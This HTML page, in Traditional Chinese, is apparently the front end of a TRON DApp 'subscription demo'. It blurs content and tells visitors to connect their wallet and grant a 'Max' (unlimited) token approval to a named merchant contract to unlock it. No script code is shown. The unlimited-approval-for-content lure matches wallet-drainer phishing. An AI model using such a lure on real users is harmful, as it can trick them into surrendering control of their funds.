<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON DApp 服務解鎖頁面</title>
    <link rel="stylesheet" href="./src/style.css">
    <style>
        /* 為了演示，將 Coinglass 內容模糊化 */
        .coinglass-content.blurred {
            filter: blur(8px);
            pointer-events: none;
            user-select: none;
        }
        /* 覆蓋層樣式：現在只作為消息提示框使用，並覆蓋消息提示 */
        #blurOverlay {
            /* 保持 flex 屬性，用於居中顯示消息 */
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            color: white;
            display: flex; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            z-index: 10;
            backdrop-filter: blur(5px);
            padding: 20px;
            box-sizing: border-box;
            /* 💡 重要：現在 DApp 啟動時它應該是 hidden */
            display: none; 
        }
        #overlayMessage {
            font-size: 1.5em;
            margin-bottom: 20px;
        }
        /* 確保連線按鈕在 header 右上角 */
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background-color: #2c2c2c; 
            color: white;
            position: relative; 
        }
        #connectButton {
            padding: 10px 15px;
            font-size: 1em;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #f7a600; 
            color: black;
            font-weight: bold;
        }
        #connectButton.connected {
            background-color: #28a745;
            color: white;
        }
    </style>
</head>
<body>

    <header>
        <h1>TRON 服務訂閱演示</h1>
        <button id="connectButton" title="連繫錢包">連繫錢包</button>
    </header>

    <main>
        <div class="coinglass-content" id="coinglassContent">
            
            <h2>🔒 內容鎖定中：請連線並授權</h2>
            
            <p>請點擊右上角按鈕連繫您的錢包並完成 Max 授權，以解鎖付費內容。</p>
            
            <div class="data-block">
                <h3>您的表單區塊 (範例)</h3>
                <form id="yourCustomForm">
                    <label for="exampleInput">請檢查表單輸入框：</label>
                    <input type="text" id="exampleInput" placeholder="這是一個測試輸入框" style="padding: 5px; width: 80%; margin-top: 5px;">
                    <p style="font-size: 0.8em; color: #888; margin-top: 5px;">這個區塊現在是清晰可見的。</p>
                </form>
            </div>
            </div>
        
        <div id="blurOverlay">
            <div id="overlayMessage">連線中...</div>
        </div>

    </main>

    <footer>
        <p>&copy; 2024 TRON DApp 服務演示. Merchant Contract: TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu</p>
    </footer>

    <script src="./src/main.js"></script>
    
</body>
</html>
